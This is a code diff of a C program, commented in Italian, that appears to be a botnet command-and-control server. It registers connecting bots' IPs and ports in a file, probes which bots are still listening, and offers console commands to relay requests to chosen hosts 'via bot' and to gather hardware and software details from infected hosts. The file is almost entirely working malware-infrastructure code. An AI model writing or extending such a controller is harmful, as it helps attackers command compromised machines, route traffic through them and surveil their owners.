@@ -6,9 +6,11 @@
 #include "cJSON.h"
 #include <time.h>
 #include <pthread.h>
+#include <netdb.h> // Per usare getaddrinfo
 
 #define PORT 8081
 #define MAX_REQUEST_SIZE 1024
+#define TIMEOUT_SECONDS 5
 
 struct Data {
     char clientIP[20];
@@ -22,8 +24,73 @@ void handle_get_request(int client_socket) {
     send(client_socket, response, strlen(response), 0);
 }
 
+// Funzione per aggiornare il record del bot nel file "bots.txt"
+void updateBotRecord(const char *clientIP, int port) {
+    // Apri il file "bots.txt" in modalità append e lettura ("a+")
+    FILE *file = fopen("bots.txt", "a+");
+    if (file != NULL) {
+        char line[1024];
+        int found = 0;
+
+        // Creare un nuovo file temporaneo
+        FILE *tempFile = fopen("bots_temp.txt", "w");
+        if (tempFile == NULL) {
+            fclose(file);
+            fprintf(stderr, "Errore nella creazione del file temporaneo 'bots_temp.txt'\n");
+            return;
+        }
+
+        while (fgets(line, sizeof(line), file) != NULL) {
+            char *timestamp = strtok(line, "|");
+            char *address = strtok(NULL, "|");
+            char *ports = strtok(NULL, "|");
+
+            if (timestamp != NULL && address != NULL && ports != NULL) {
+                if (strcmp(address, clientIP) == 0) {
+                    // Trovato un record con lo stesso indirizzo IP, aggiorna la porta
+                    found = 1;
+                    time_t now;
+                    time(&now);
+                    struct tm *tm_info = localtime(&now);
+                    char newTimestamp[20];
+                    strftime(newTimestamp, sizeof(newTimestamp), "%Y-%m-%d %H:%M:%S", tm_info);
+                    fprintf(tempFile, "%s|%s|%d\n", newTimestamp, clientIP, port);
+                } else {
+                    // Mantieni il record invariato
+                    fprintf(tempFile, "%s|%s|%s", timestamp, address, ports);
+                }
+            }
+        }
+
+        if (!found) {
+            // Se non è stato trovato un record corrispondente, aggiungilo
+            time_t now;
+            time(&now);
+            struct tm *tm_info = localtime(&now);
+            char timestamp[20];
+            strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm_info);
+            fprintf(tempFile, "%s|%s|%d\n", timestamp, clientIP, port);
+        }
+
+        // Chiudi entrambi i file
+        fclose(file);
+        fclose(tempFile);
+
+        // Sostituisci il file originale con il file temporaneo
+        if (remove("bots.txt") != 0) {
+            fprintf(stderr, "Errore nella rimozione del file 'bots.txt'\n");
+        }
+        if (rename("bots_temp.txt", "bots.txt") != 0) {
+            fprintf(stderr, "Errore nella sostituzione del file 'bots.txt'\n");
+        }
+    } else {
+        fprintf(stderr, "Errore nell'apertura o creazione del file 'bots.txt'\n");
+    }
+}
+
+
 void handle_post_request(int client_socket, char *data) {
-    printf("Received POST data: %s\n", data);
+//    printf("Received POST data: %s\n", data);
 
     cJSON *json = cJSON_Parse(data);
     if (json == NULL) {
@@ -45,9 +112,19 @@ void handle_post_request(int client_socket, char *data) {
 
     char *clientIP = strdup(clientIPItem->valuestring);
 
-    cJSON_Delete(json);
 
-    printf("Client IP: %s\n", clientIP);
+    // Dichiara una variabile per la porta
+    int port;
+
+    // Ottenere le porte dall'array cJSON
+    for (int i = 0; i < cJSON_GetArraySize(portsArray); i++) {
+        cJSON *portItem = cJSON_GetArrayItem(portsArray, i);
+        if (cJSON_IsNumber(portItem)) {
+            port = portItem->valueint;
+            // Chiamata per aggiornare o aggiungere il record del bot
+            updateBotRecord(clientIP, port);
+        }
+    }
 
     // Prepara la risposta JSON
     cJSON *responseJson = cJSON_CreateObject();
@@ -65,44 +142,103 @@ void handle_post_request(int client_socket, char *data) {
     send(client_socket, responseJsonStr, strlen(responseJsonStr), 0);
     free(responseJsonStr);
 
-    // Apri o crea il file "bots.txt" in modalità append
-    FILE *file = fopen("bots.txt", "a");
-    if (file != NULL) {
-        // Scrivi il timestamp
-        time_t now;
-        time(&now);
-        struct tm *tm_info = localtime(&now);
-        char timestamp[20];
-        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm_info);
-
-        // Scrivi l'indirizzo IP estratto dalla variabile clientIP
-        fprintf(file, "%s|%s|", timestamp, clientIP);
-
-        // Scrivi le porte se sono presenti
-        if (cJSON_IsArray(portsArray)) {
-            fprintf(file, "|"); // Aggiungi il separatore dopo l'indirizzo IP
-
-            for (int i = 0; i < cJSON_GetArraySize(portsArray); i++) {
-                cJSON *portItem = cJSON_GetArrayItem(portsArray, i);
-                if (cJSON_IsNumber(portItem)) {
-                    fprintf(file, "%d", portItem->valueint);
-
-                    if (i < cJSON_GetArraySize(portsArray) - 1) {
-                        fprintf(file, ",");
-                    }
-                }
-            }
-        }
-
-        // Aggiungi un carattere di nuova riga alla fine
-        fprintf(file, "\n");
-        fclose(file);
-    }
-
     // Libera la memoria allocata per clientIP
     free(clientIP);
 }
 
+int isBotListening(const char *address, int port) {
+    struct sockaddr_in server_addr;
+    int sockfd;
+
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(port);
+
+    if (inet_pton(AF_INET, address, &server_addr.sin_addr) <= 0) {
+        return 0;  // Non in ascolto (errore nell'indirizzo IP)
+    }
+
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd == -1) {
+        return 0;  // Non in ascolto (errore nel socket)
+    }
+
+    // Imposta un timeout di 5 secondi
+    struct timeval timeout;
+    timeout.tv_sec = 5;
+    timeout.tv_usec = 0;
+    if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) < 0) {
+        close(sockfd);
+        return 0;  // Non in ascolto (errore nel timeout)
+    }
+
+    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
+        // Connessione riuscita, chiudi il socket e restituisci 1
+        return 1;
+    } else {
+        close(sockfd);
+        return 0;  // Non in ascolto (errore nella connessione)
+    }
+}
+
+void printBotList() {
+    // Apri il file "bots.txt" in modalità di lettura
+    FILE *file = fopen("bots.txt", "r");
+    if (file == NULL) {
+        printf("No connected bots currently.\n");
+        return;
+    }
+
+    char line[1024];
+    char botAddresses[1024][1024];
+    int botPorts[1024];
+    int numBots = 0;
+
+    // Leggi il file riga per riga
+    while (fgets(line, sizeof(line), file) != NULL) {
+        char *timestamp = strtok(line, "|");
+        char *address = strtok(NULL, "|");
+        char *ports = strtok(NULL, "|");
+
+        if (timestamp != NULL && address != NULL && ports != NULL) {
+            // Verifica se l'indirizzo IP è già presente nella lista
+            int found = 0;
+            for (int i = 0; i < numBots; i++) {
+                if (strcmp(botAddresses[i], address) == 0) {
+                    found = 1;
+                    // Aggiorna la porta solo se è più recente
+                    if (atoi(ports) > botPorts[i]) {
+                        botPorts[i] = atoi(ports);
+                    }
+                    break;
+                }
+            }
+
+            if (!found) {
+                strcpy(botAddresses[numBots], address);
+                botPorts[numBots] = atoi(ports);
+                numBots++;
+            }
+        }
+    }
+
+    // Chiudi il file
+    fclose(file);
+
+    // Stampare la lista di indirizzi IP e porte più aggiornata
+    int activeBotCount = 0;
+    printf("List of active bots with the most updated port numbers:\n");
+    for (int i = 0; i < numBots; i++) {
+        if (isBotListening(botAddresses[i], botPorts[i])) {
+            printf("%d) %s %d\n", activeBotCount + 1, botAddresses[i], botPorts[i]);
+            activeBotCount++;
+        }
+    }
+
+    if (activeBotCount == 0) {
+        printf("No connected bots currently.\n");
+    }
+}
 
 // Funzione del thread per la gestione dell'input dell'utente
 void *user_input_thread(void *arg) {
@@ -116,13 +252,17 @@ void *user_input_thread(void *arg) {
             break;  // Termina il loop in caso di errore o fine dell'input
         }
 
-        //list command
+        // list command
         if (strcmp(command, "list\n") == 0) {
             // Eseguire un'azione di uscita o terminare il server
-            printf("1) request {hostname:port}\n Send a request to a specified hostname and port via bot.\n\n2) hardware-info\n Receive hardware and software information about hosts connected to this botnet.\n\n");
+            printf("1) botnet\n get the list of ip and ports of active bots with specific target id.\n\n2) request {hostname:port} {target}\n Send a request to a specified hostname and port via bot.\n\n3) get info {target}\n Receive hardware and software information about hosts connected to this botnet.\n\n");
         }
-        //exit
-        if (strcmp(command, "exit\n") == 0) {
+            // botnet command
+        else if (strcmp(command, "botnet\n") == 0) {
+            printBotList();
+        }
+            // exit command
+        else if (strcmp(command, "exit\n") == 0) {
             // Eseguire un'azione di uscita o terminare il server
             exit(0);
         }
@@ -130,7 +270,6 @@ void *user_input_thread(void *arg) {
 
     return NULL;
 }
-
 
 int main() {
     int server_socket, client_socket;
@@ -216,4 +355,3 @@ int main() {
 
     return 0;
 }
-
